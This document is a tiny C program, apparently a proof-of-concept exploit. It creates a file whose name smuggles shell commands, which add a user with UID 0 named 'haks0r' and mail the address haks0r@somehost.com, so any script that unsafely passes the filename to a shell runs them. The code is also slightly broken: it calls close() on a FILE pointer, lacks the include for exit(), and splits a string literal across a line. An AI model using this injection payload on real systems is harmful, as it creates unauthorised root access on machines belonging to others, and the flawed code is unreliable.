#include <stdio.h>

int main()
{
   FILE *f;
   char filename[100] = ";useradd -u 0 -g 0 haks0r;mail 
haks0r@somehost.com<blablabla";

   if((f = fopen(filename, "a")) == 0) {
      perror("Could not create file");
      exit(1);
   }
   close(f);
}
